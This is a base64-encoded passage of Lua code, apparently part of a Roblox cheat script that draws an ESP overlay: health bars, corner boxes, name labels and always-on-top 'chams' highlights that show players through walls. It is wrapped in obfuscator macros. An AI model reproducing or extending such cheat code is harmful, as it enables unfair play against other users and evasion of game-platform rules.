zID0gQ29sb3IzLmZyb21SR0IoMjU1LCAyNTUsIDI1NSksIEJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAwfSkKICAgICAgICAgICAgbG9jYWwgQmVoaW5kSGVhbHRoYmFyID0gRnVuY3Rpb25zOkNyZWF0ZSgiRnJhbWUiLCB7Qm9yZGVyQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoMCwgMCwgMCksIFBhcmVudCA9IFNjcmVlbkd1aSwgWkluZGV4ID0gLTEsIEJhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigwLCAwLCAwKSwgQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDB9KQogICAgICAgICAgICBsb2NhbCBIZWFsdGhiYXJHcmFkaWVudCA9IEZ1bmN0aW9uczpDcmVhdGUoIlVJR3JhZGllbnQiLCB7UGFyZW50ID0gSGVhbHRoYmFyLCBFbmFibGVkID0gQ29uZmlnLkVTUC5EcmF3aW5nLkhlYWx0aGJhci5HcmFkaWVudCwgUm90YXRpb24gPSAtOTAsIENvbG9yID0gQ29sb3JTZXF1ZW5jZS5uZXd7Q29sb3JTZXF1ZW5jZUtleXBvaW50Lm5ldygwLCBDb25maWcuRVNQLkRyYXdpbmcuSGVhbHRoYmFyLkdyYWRpZW50UkdCMSksIENvbG9yU2VxdWVuY2VLZXlwb2ludC5uZXcoMSwgQ29uZmlnLkVTUC5EcmF3aW5nLkhlYWx0aGJhci5HcmFkaWVudFJHQjIpfX0pCiAgICAgICAgICAgIGxvY2FsIEhlYWx0aFRleHQgPSBGdW5jdGlvbnM6Q3JlYXRlKCJUZXh0TGFiZWwiLCB7VmlzaWJsZSA9IGZhbHNlLFBhcmVudCA9IFNjcmVlbkd1aSwgUG9zaXRpb24gPSBVRGltMi5uZXcoMC41LCAwLCAwLCAzMSksIFNpemUgPSBVRGltMi5uZXcoMCwgMTAwLCAwLCAyMCksIEFuY2hvclBvaW50ID0gVmVjdG9yMi5uZXcoMC41LCAwLjUpLCBCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMSwgVGV4dENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpLCBGb250ID0gRW51bS5Gb250LkNvZGUsIFRleHRTaXplID0gQ29uZmlnLkVTUC5Gb250U2l6ZSwgVGV4dFN0cm9rZVRyYW5zcGFyZW5jeSA9IDAsIFRleHRTdHJva2VDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigwLCAwLCAwKSwgWkluZGV4ID0gNTAwfSkKICAgICAgICAgICAgbG9jYWwgQ2hhbXMgPSBGdW5jdGlvbnM6Q3JlYXRlKCJIaWdobGlnaHQiLCB7UGFyZW50ID0gU2NyZWVuR3VpLCBGaWxsVHJhbnNwYXJlbmN5ID0gMSwgT3V0bGluZVRyYW5zcGFyZW5jeSA9IDAsIE91dGxpbmVDb2xvciA9IENvbG9yMy5mcm9tUkdCKDExOSwgMTIwLCAyNTUpLCBEZXB0aE1vZGUgPSAiQWx3YXlzT25Ub3AifSkKICAgICAgICAgICAgbG9jYWwgV2VhcG9uSWNvbiA9IEZ1bmN0aW9uczpDcmVhdGUoIkltYWdlTGFiZWwiLCB7UGFyZW50ID0gU2NyZWVuR3VpLCBCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMSwgQm9yZGVyQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoMCwgMCwgMCksIEJvcmRlclNpemVQaXhlbCA9IDAsIFNpemUgPSBVRGltMi5uZXcoMCwgNDAsIDAsIDQwKX0pCiAgICAgICAgICAgIGxvY2FsIEdyYWRpZW50MyA9IEZ1bmN0aW9uczpDcmVhdGUoIlVJR3JhZGllbnQiLCB7UGFyZW50ID0gV2VhcG9uSWNvbiwgUm90YXRpb24gPSAtOTAsIEVuYWJsZWQgPSBDb25maWcuRVNQLkRyYXdpbmcuV2VhcG9ucy5HcmFkaWVudCwgQ29sb3IgPSBDb2xvclNlcXVlbmNlLm5ld3tDb2xvclNlcXVlbmNlS2V5cG9pbnQubmV3KDAsIENvbmZpZy5FU1AuRHJhd2luZy5XZWFwb25zLkdyYWRpZW50UkdCMSksIENvbG9yU2VxdWVuY2VLZXlwb2ludC5uZXcoMSwgQ29uZmlnLkVTUC5EcmF3aW5nLldlYXBvbnMuR3JhZGllbnRSR0IyKX19KQogICAgICAgICAgICBsb2NhbCBMZWZ0VG9wID0gRnVuY3Rpb25zOkNyZWF0ZSgiRnJhbWUiLCB7UGFyZW50ID0gU2NyZWVuR3VpLCBCYWNrZ3JvdW5kQ29sb3IzID0gQ29uZmlnLkVTUC5EcmF3aW5nLkJveGVzLkNvcm5lci5SR0IsIFBvc2l0aW9uID0gVURpbTIubmV3KDAsIDAsIDAsIDApLCBCb3JkZXJTaXplUGl4ZWwgPSAwLCBCb3JkZXJDb2xvcjMgPSBDb2xvcjMubmV3KDAsMCwwKX0pCiAgICAgICAgICAgIGxvY2FsIExlZnRTaWRlID0gRnVuY3Rpb25zOkNyZWF0ZSgiRnJhbWUiLCB7UGFyZW50ID0gU2NyZWVuR3VpLCBCYWNrZ3JvdW5kQ29sb3IzID0gQ29uZmlnLkVTUC5EcmF3aW5nLkJveGVzLkNvcm5lci5SR0IsIFBvc2l0aW9uID0gVURpbTIubmV3KDAsIDAsIDAsIDApLCBCb3JkZXJTaXplUGl4ZWwgPSAwLCBCb3JkZXJDb2xvcjMgPSBDb2xvcjMubmV3KDAsMCwwKX0pCiAgICAgICAgICAgIGxvY2FsIFJpZ2h0VG9wID0gRnVuY3Rpb25zOkNyZWF0ZSgiRnJhbWUiLCB7UGFyZW50ID0gU2NyZWVuR3VpLCBCYWNrZ3JvdW5kQ29sb3IzID0gQ29uZmlnLkVTUC5EcmF3aW5nLkJveGVzLkNvcm5lci5SR0IsIFBvc2l0aW9uID0gVURpbTIubmV3KDAsIDAsIDAsIDApLCBCb3JkZXJTaXplUGl4ZWwgPSAwLCBCb3JkZXJDb2xvcjMgPSBDb2xvcjMubmV3KDAsMCwwKX0pCiAgICAgICAgICAgIGxvY2FsIFJpZ2h0U2lkZSA9IEZ1bmN0aW9uczpDcmVhdGUoIkZyYW1lIiwge1BhcmVudCA9IFNjcmVlbkd1aSwgQmFja2dyb3VuZENvbG9yMyA9IENvbmZpZy5FU1AuRHJhd2luZy5Cb3hlcy5Db3JuZXIuUkdCLCBQb3NpdGlvbiA9IFVEaW0yLm5ldygwLCAwLCAwLCAwKSwgQm9yZGVyU2l6ZVBpeGVsID0gMCwgQm9yZGVyQ29sb3IzID0gQ29sb3IzLm5ldygwLDAsMCl9KQogICAgICAgICAgICBsb2NhbCBCb3R0b21TaWRlID0gRnVuY3Rpb25zOkNyZWF0ZSgiRnJhbWUiLCB7UGFyZW50ID0gU2NyZWVuR3VpLCBCYWNrZ3JvdW5kQ29sb3IzID0gQ29uZmlnLkVTUC5EcmF3aW5nLkJveGVzLkNvcm5lci5SR0IsIFBvc2l0aW9uID0gVURpbTIubmV3KDAsIDAsIDAsIDApLCBCb3JkZXJTaXplUGl4ZWwgPSAwLCBCb3JkZXJDb2xvcjMgPSBDb2xvcjMubmV3KDAsMCwwKX0pCiAgICAgICAgICAgIGxvY2FsIEJvdHRvbURvd24gPSBGdW5jdGlvbnM6Q3JlYXRlKCJGcmFtZSIsIHtQYXJlbnQgPSBTY3JlZW5HdWksIEJhY2tncm91bmRDb2xvcjMgPSBDb25maWcuRVNQLkRyYXdpbmcuQm94ZXMuQ29ybmVyLlJHQiwgUG9zaXRpb24gPSBVRGltMi5uZXcoMCwgMCwgMCwgMCksIEJvcmRlclNpemVQaXhlbCA9IDAsIEJvcmRlckNvbG9yMyA9IENvbG9yMy5uZXcoMCwwLDApfSkKICAgICAgICAgICAgbG9jYWwgQm90dG9tUmlnaHRTaWRlID0gRnVuY3Rpb25zOkNyZWF0ZSgiRnJhbWUiLCB7UGFyZW50ID0gU2NyZWVuR3VpLCBCYWNrZ3JvdW5kQ29sb3IzID0gQ29uZmlnLkVTUC5EcmF3aW5nLkJveGVzLkNvcm5lci5SR0IsIFBvc2l0aW9uID0gVURpbTIubmV3KDAsIDAsIDAsIDApLCBCb3JkZXJTaXplUGl4ZWwgPSAwLCBCb3JkZXJDb2xvcjMgPSBDb2xvcjMubmV3KDAsMCwwKX0pCiAgICAgICAgICAgIGxvY2FsIEJvdHRvbVJpZ2h0RG93biA9IEZ1bmN0aW9uczpDcmVhdGUoIkZyYW1lIiwge1BhcmVudCA9IFNjcmVlbkd1aSwgQmFja2dyb3VuZENvbG9yMyA9IENvbmZpZy5FU1AuRHJhd2luZy5Cb3hlcy5Db3JuZXIuUkdCLCBQb3NpdGlvbiA9IFVEaW0yLm5ldygwLCAwLCAwLCAwKSwgQm9yZGVyU2l6ZVBpeGVsID0gMCwgQm9yZGVyQ29sb3IzID0gQ29sb3IzLm5ldygwLDAsMCl9KQogICAgICAgICAgICBsb2NhbCBGbGFnMSA9IEZ1bmN0aW9uczpDcmVhdGUoIlRleHRMYWJlbCIsIHtWaXNpYmxlID0gZmFsc2UsUGFyZW50ID0gU2NyZWVuR3VpLCBQb3NpdGlvbiA9IFVEaW0yLm5ldygxLCAwLCAwLCAwKSwgU2l6ZSA9IFVEaW0yLm5ldygwLCAxMDAsIDAsIDIwKSwgQW5jaG9yUG9pbnQgPSBWZWN0b3IyLm5ldygwLjUsIDAuNSksIEJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxLCBUZXh0Q29sb3IzID0gQ29sb3IzLmZyb21SR0IoMjU1LCAyNTUsIDI1NSksIEZvbnQgPSBFbnVtLkZvbnQuQ29kZSwgVGV4dFNpemUgPSBDb25maWcuRVNQLkZvbnRTaXplLCBUZXh0U3Ryb2tlVHJhbnNwYXJlbmN5ID0gMCwgVGV4dFN0cm9rZUNvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDAsIDAsIDApfSkKICAgICAgICAgICAgbG9jYWwgRmxhZzIgPSBGdW5jdGlvbnM6Q3JlYXRlKCJUZXh0TGFiZWwiLCB7VmlzaWJsZSA9IGZhbHNlLFBhcmVudCA9IFNjcmVlbkd1aSwgUG9zaXRpb24gPSBVRGltMi5uZXcoMSwgMCwgMCwgMCksIFNpemUgPSBVRGltMi5uZXcoMCwgMTAwLCAwLCAyMCksIEFuY2hvclBvaW50ID0gVmVjdG9yMi5uZXcoMC41LCAwLjUpLCBCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMSwgVGV4dENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpLCBGb250ID0gRW51bS5Gb250LkNvZGUsIFRleHRTaXplID0gQ29uZmlnLkVTUC5Gb250U2l6ZSwgVGV4dFN0cm9rZVRyYW5zcGFyZW5jeSA9IDAsIFRleHRTdHJva2VDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigwLCAwLCAwKX0pCiAgICAgICAgICAgIC0tbG9jYWwgRHJvcHBlZEl0ZW1zID0gRnVuY3Rpb25zOkNyZWF0ZSgiVGV4dExhYmVsIiwge1Zpc2libGUgPSBmYWxzZSxQYXJlbnQgPSBTY3JlZW5HdWksIEFuY2hvclBvaW50ID0gVmVjdG9yMi5uZXcoMC41LCAwLjUpLCBCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMSwgVGV4dENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpLCBGb250ID0gRW51bS5Gb250LkNvZGUsIFRleHRTaXplID0gQ29uZmlnLkVTUC5Gb250U2l6ZSwgVGV4dFN0cm9rZVRyYW5zcGFyZW5jeSA9IDAsIFRleHRTdHJva2VDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigwLCAwLCAwKX0pCiAgICAgICAgICAgIC0tCiAgICAgICAgICAgIEZ1bmN0aW9ucy5BZGRPdXRsaW5lKExlZnRUb3AsIDEpOyBGdW5jdGlvbnMuQWRkT3V0bGluZShMZWZ0U2lkZSwgMSk7IEZ1bmN0aW9ucy5BZGRPdXRsaW5lKExlZnRTaWRlLCAxKTsgRnVuY3Rpb25zLkFkZE91dGxpbmUoUmlnaHRUb3AsIDEpOyBGdW5jdGlvbnMuQWRkT3V0bGluZShSaWdodFNpZGUsIDEpOyBGdW5jdGlvbnMuQWRkT3V0bGluZShCb3R0b21TaWRlLCAxKTsgRnVuY3Rpb25zLkFkZE91dGxpbmUoQm90dG9tRG93biwgMSk7IEZ1bmN0aW9ucy5BZGRPdXRsaW5lKEJvdHRvbVJpZ2h0U2lkZSwgMSk7IEZ1bmN0aW9ucy5BZGRPdXRsaW5lKEJvdHRvbVJpZ2h0RG93biwgMSk7IAogICAgICAgICAgICBpZiBub3QgcGxyLkNoYXJhY3RlciB0aGVuIHBsci5DaGFyYWN0ZXJBZGRlZDpXYWl0KCkgZW5kCiAgICAgICAgICAgIGxvY2FsIEh1bWFub2lkLCBIUlAgPSBwbHIuQ2hhcmFjdGVyOldhaXRGb3JDaGlsZCgiSHVtYW5vaWQiKSwgcGxyLkNoYXJhY3RlcjpXYWl0Rm9yQ2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKQoKICAgICAgICAgICAgbG9jYWwgUG9zLCBPblNjcmVlbiA9IENhbTpXb3JsZFRvU2NyZWVuUG9pbnQoSFJQLlBvc2l0aW9uKQogICAgICAgICAgICBsb2NhbCBEaXN0ID0gKENhbS5DRnJhbWUuUG9zaXRpb24gLSBIUlAuUG9zaXRpb24pLk1hZ25pdHVkZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgIGxvY2FsIFNpemUgPSBIUlAuU2l6ZS5ZCgogICAgICAgICAgICBpZiBEZWZhdWx0UGxheWVyU2V0dGluZ3NbcGxyLk5hbWVdIGFuZCBEZWZhdWx0UGxheWVyU2V0dGluZ3NbcGxyLk5hbWVdLlJvb3RTZXR0aW5ncyBhbmQgRGVmYXVsdFBsYXllclNldHRpbmdzW3Bsci5OYW1lXS5Sb290U2V0dGluZ3MuU2l6ZSB0aGVuCiAgICAgICAgICAgICAgICBTaXplID0gRGVmYXVsdFBsYXllclNldHRpbmdzW3Bsci5OYW1lXS5Sb290U2V0dGluZ3MuU2l6ZS5ZCiAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgbG9jYWwgaGVhbHRoX2NsYW1wZWQgPSBtYXRoLmNsYW1wKEh1bWFub2lkLkhlYWx0aCwgMCwgSHVtYW5vaWQuTWF4SGVhbHRoKQogICAgICAgICAgICBsb2NhbCBoZWFsdGggPSBoZWFsdGhfY2xhbXBlZCAvIEh1bWFub2lkLk1heEhlYWx0aDsKICAgICAgICAgICAgCiAgICAgICAgICAgIGxvY2FsIHNjYWxlRmFjdG9yID0gKFNpemUgKiBDYW0uVmlld3BvcnRTaXplLlkpIC8gKFBvcy5aICogMikKICAgICAgICAgICAgCiAgICAgICAgICAgIGxvY2FsIHcsIGggPSAzICogc2NhbGVGYWN0b3IsIDQuNSAqIHNjYWxlRmFjdG9yCgogICAgICAgICAgICBpZiBub3QgUGxheWVyc19FU1BbcGxyLk5hbWVdIHRoZW4KICAgICAgICAgICAgICAgIC0tIEVSUk9SIEJFQ0FVU0UgTEVBVkUgKyBKT0lOIE5FVyBQTEFZRVIgQ0hBUkFDVEVSIE5FVyBFU1AgRUxFTVROUwoKICAgICAgICAgICAgICAgIFBsYXllcnNfRVNQW3Bsci5OYW1lXSA9IHt9CiAgICAgICAgICAgICAgICBQbGF5ZXJzX0VTUFtwbHIuTmFtZV0uUmVmcmVzaEVsZW1lbnRzID0gTFBIX0pJVF9NQVgoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgICAgIHRhc2suc3Bhd24oTFBIX05PX1ZJUlRVQUxJWkUoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgICAgICAgICBpZiBDb25maWcuRVNQLkZvbnQgPT0gRm9udHNbIlBsZXgiXSBvciBDb25maWcuRVNQLkZvbnQgPT0gRm9udHNbIlBpeGVsIl0gb3IgQ29uZmlnLkVTUC5Gb250ID09IEZvbnRzWyJNaW5lY3JhZnRpYSJdIG9yIENvbmZpZy5FU1AuRm9udCA9PSBGb250c1siVmVyZGFuYSJdIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIEhlYWx0aFRleHQuRm9udEZhY2UgPSBDb25maWcuRVNQLkZvbnQKICAgICAgICAgICAgICAgICAgICAgICAgICAgIE5hbWUuRm9udEZhY2UgPSBDb25maWcuRVNQLkZvbnQKICAgICAgICAgICAgICAgICAgICAgICAgICAgIERpc3RhbmNlLkZvbnRGYWNlID0gQ29uZmlnLkVTUC5Gb250CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBXZWFwb24uRm9udEZhY2UgPSBDb25maWcuRVNQLkZvbnQKICAgICAgICAgICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgSGVhbHRoVGV4dC5Gb250ID0gQ29uZmlnLkVTUC5Gb250CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBOYW1lLkZvbnQgPSBDb25maWcuRVNQLkZvbnQKICAgICAgICAgICAgICAgICAgICAgICAgICAgIERpc3RhbmNlLkZvbnQgPSBDb25maWcuRVNQLkZvbnQKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFdlYXBvbi5Gb250ID0gQ29uZmlnLkVTUC5Gb250CiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgICAgICAgICAgZG8gLS0gXFwgQm94ZXMKICAgICAgICAgICAgICAgICAgICAgICAgICAgIEJveC5WaXNpYmxlID0gQ29uZmlnLkVTUC5EcmF3aW5nLkJveGVzLkZ1bGwuRW5hYmxlZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgQ29uZmlnLkVTUC5EcmF3aW5nLkJveGVzLkZpbGxlZC5FbmFibGVkIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBCb3guQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgQ29uZmlnLkVTUC5EcmF3aW5nLkJveGVzLkdyYWRpZW50RmlsbCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEJveC5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gQ29uZmlnLkVTUC5EcmF3aW5nLkJveGVzLkZpbGxlZC5UcmFuc3BhcmVuY3k7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBCb3guQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDEKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBCb3guQm9yZGVyU2l6ZVBpeGVsID0gMQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEJveC5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgbm90IENvbmZpZy5FU1AuRHJhd2luZy5Cb3hlcy5Cb3VuZGluZy5FbmFibGVkIG9yIChDb25maWcuRVNQLkRyYXdpbmcuQm94ZXMuQ29ybmVyLkVuYWJsZWQgYW5kIENvbmZpZy5FU1AuRHJhd2luZy5Cb3hlcy5Cb3VuZGluZy5FbmFibGVkKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgTGVmdFRvcC5UcmFuc3BhcmVuY3kgPSBDb25maWcuRVNQLkRyYXdpbmcuQm94ZXMuQ29ybmVyLlRyYW5zcGFyZW5jeQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIExlZnRUb3AuQmFja2dyb3VuZENvbG9yMyA9IENvbmZpZy5FU1AuRHJhd2luZy5Cb3hlcy5Db3JuZXIuUkdCCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIExlZnRTaWRlLlRyYW5zcGFyZW5jeSA9IENvbmZpZy5FU1AuRHJhd2luZy5Cb3hlcy5Db3JuZXIuVHJhbnNwYXJlbmN5CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgTGVmdFNpZGUuQmFja2dyb3VuZENvbG9yMyA9IENvbmZpZy5FU1AuRHJhd2luZy5Cb3hlcy5Db3JuZXIuUkdCCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEJvdHRvbVNpZGUuVHJhbnNwYXJlbmN5ID0gQ29uZmlnLkVTUC5EcmF3aW5nLkJveGVzLkNvcm5lci5UcmFuc3BhcmVuY3kKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBCb3R0b21TaWRlLkJhY2tncm91bmRDb2xvcjMgPSBDb25maWcuRVNQLkRyYXdpbmcuQm94ZXMuQ29ybmVyLlJHQgoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBCb3R0b21Eb3duLlRyYW5zcGFyZW5jeSA9IENvbmZpZy5FU1AuRHJhd2luZy5Cb3hlcy5Db3JuZXIuVHJhbnNwYXJlbmN5CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQm90dG9tRG93bi5CYWNrZ3JvdW5kQ29sb3IzID0gQ29uZmlnLkVTUC5EcmF3aW5nLkJveGVzLkNvcm5lci5SR0IKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUmlnaHRUb3AuVHJhbnNwYXJlbmN5ID0gQ29uZmlnLkVTUC5EcmF3aW5nLkJveGVzLkNvcm5lci5UcmFuc3BhcmVuY3kKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBSaWdodFRvcC5CYWNrZ3JvdW5kQ29sb3IzID0gQ29uZmlnLkVTUC5EcmF3aW5nLkJveGVzLkNvcm5lci5SR0IKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUmlnaHRTaWRlLlRyYW5zcGFyZW5jeSA9IENvbmZpZy5FU1AuRHJhd2luZy5Cb3hlcy5Db3JuZXIuVHJhbnNwYXJlbmN5CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUmlnaHRTaWRlLkJhY2tncm91bmRDb2xvcjMgPSBDb25maWcuRVNQLkRyYXdpbmcuQm94ZXMuQ29ybmVyLlJHQgoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBCb3R0b21SaWdodFNpZGUuVHJhbnNwYXJlbmN5ID0gQ29uZmlnLkVTUC5EcmF3aW5nLkJveGVzLkNvcm5lci5UcmFuc3BhcmVuY3kKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBCb3R0b21SaWdodFNpZGUuQmFja2dyb3VuZENvbG9yMyA9IENvbmZpZy5FU1AuRHJhd2luZy5Cb3hlcy5Db3JuZXIuUkdCCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEJvdHRvbVJpZ2h0RG93bi5UcmFuc3BhcmVuY3kgPSBDb25maWcuRVNQLkRyYXdpbmcuQm94ZXMuQ29ybmVyLlRyYW5zcGFyZW5jeQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEJvdHRvbVJpZ2h0RG93bi5CYWNrZ3JvdW5kQ29sb3IzID0gQ29uZmlnLkVTUC5EcmF3aW5nLkJveGVzLkNvcm5lci5SR0IKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIG5vdCBDb25maWcuRVNQLkRyYXdpbmcuQm94ZXMuQ29ybmVyLkVuYWJsZWQgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIExlZnRUb3AuVHJhbnNwYXJlbmN5ID0gQ29uZmlnLkVTUC5EcmF3aW5nLkJveGVzLkJvdW5kaW5nLlRyYW5zcGFyZW5jeQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIExlZnRTaWRlLlRyYW5zcGFyZW5jeSA9IENvbmZpZy5FU1AuRHJhd2luZy5Cb3hlcy5Cb3VuZGluZy5UcmFuc3BhcmVuY3kKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBCb3R0b21TaWRlLlRyYW5zcGFyZW5jeSA9IENvbmZpZy5FU1AuRHJhd2luZy5Cb3hlcy5Cb3VuZGluZy5UcmFuc3BhcmVuY3kKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBSaWdodFNpZGUuVHJhbnNwYXJlbmN5ID0gQ29uZmlnLkVTUC5EcmF3aW5nLkJveGVzLkJvdW5kaW5nLlRyYW5zcGFyZW5jeQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBMZWZ0VG9wLkJhY2tncm91bmRDb2xvcjMgPSBDb25maWcuRVNQLkRyYXdpbmcuQm94ZXMuQm91bmRpbmcuUkdCCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgTGVmdFNpZGUuQmFja2dyb3VuZENvbG9yMyA9IENvbmZpZy5FU1AuRHJhd2luZy5Cb3hlcy5Cb3VuZGluZy5SR0IKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBCb3R0b21TaWRlLkJhY2tncm91bmRDb2xvcjMgPSBDb25maWcuRVNQLkRyYXdpbmcuQm94ZXMuQm91bmRpbmcuUkdCCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUmlnaHRTaWRlLkJhY2tncm91bmRDb2xvcjMgPSBDb25maWcuRVNQLkRyYXdpbmcuQm94ZXMuQm91bmRpbmcuUkdCCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBCb3R0b21TaWRlLkFuY2hvclBvaW50ID0gVmVjdG9yMi5uZXcoMCwgNSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIEJvdHRvbURvd24uQW5jaG9yUG9pbnQgPSBWZWN0b3IyLm5ldygwLCAxKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgUmlnaHRUb3AuQW5jaG9yUG9pbnQgPSBWZWN0b3IyLm5ldygxLCAwKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgUmlnaHRTaWRlLkFuY2hvclBvaW50ID0gVmVjdG9yMi5uZXcoMCwgMCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIEJvdHRvbVJpZ2h0U2lkZS5BbmNob3JQb2ludCA9IFZlY3RvcjIubmV3KDEsIDEpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBCb3R0b21SaWdodERvd24uQW5jaG9yUG9pbnQgPSBWZWN0b3IyLm5ldygxLCAxKQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIG5vdCBDb25maWcuRVNQLkRyYXdpbmcuQm94ZXMuQW5pbWF0ZSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgR3JhZGllbnQxLlJvdGF0aW9uID0gLTQ1CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgR3JhZGllbnQyLlJvdGF0aW9uID0gLTQ1CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBHcmFkaWVudDEuQ29sb3IgPSBDb2xvclNlcXVlbmNlLm5ld3tDb2xvclNlcXVlbmNlS2V5cG9pbnQubmV3KDAsIENvbmZpZy5FU1AuRHJhd2luZy5Cb3hlcy5HcmFkaWVudEZpbGxSR0IxKSwgQ29sb3JTZXF1ZW5jZUtleXBvaW50Lm5ldygxLCBDb25maWcuRVNQLkRyYXdpbmcuQm94ZXMuR3JhZGllbnRGaWxsUkdCMil9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBHcmFkaWVudDIuQ29sb3IgPSBDb2xvclNlcXVlbmNlLm5ld3tDb2xvclNlcXVlbmNlS2V5cG9pbnQubmV3KDAsIENvbmZpZy5FU1AuRHJhd2luZy5Cb3hlcy5HcmFkaWVudFJHQjEpLCBDb2xvclNlcXVlbmNlS2V5cG9pbnQubmV3KDEsIENvbmZpZy5FU1AuRHJhd2luZy5Cb3hlcy5HcmFkaWVudFJHQjIpfQogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgIGRvIC0tIFxcIE5hbWVzCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBOYW1lLlRleHRTaXplID0gQ29uZmlnLkVTUC5Gb250U2l6ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgLS1OYW1lLkZvbnQgPSBDb25maWcuRVNQLkZvbnQKICAgICAgICAgICAgICAgICAgICAgICAgICAgIE5hbWUuVGV4dENvbG9yMyA9IENvbmZpZy5FU1AuRHJhd2luZy5OYW1lcy5SR0IKICAgICAgICAgICAgICAgICAgICAgICAgICAgIE5hbWUuVGV4dFN0cm9rZVRyYW5zcGFyZW5jeSA9IENvbmZpZy5FU1AuRHJhd2luZy5OYW1lcy5UcmFuc3BhcmVuY3kKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCgogICAgICAgICAgICAgICAgICAgICAgICBkbyAtLSBcXCBDaGFtcwogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgQ29uZmlnLkVTUC5EcmF3aW5nLkNoYW1zLlZpc2libGVDaGVjayB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQ2hhbXMuRGVwdGhNb2RlID0gIk9jY2x1ZGVkIgogICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgIC